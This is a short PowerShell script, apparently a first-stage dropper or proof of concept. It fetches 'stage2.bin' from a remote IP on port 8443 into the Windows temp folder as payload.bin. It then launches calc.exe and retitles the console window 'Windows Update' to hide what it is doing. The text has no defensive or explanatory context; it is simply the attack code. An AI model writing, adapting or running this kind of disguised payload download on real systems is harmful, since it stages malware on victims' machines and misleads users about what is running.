
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://203.0.113.201:8443/stage2.bin",
    [string]$WorkingPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $WorkingPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
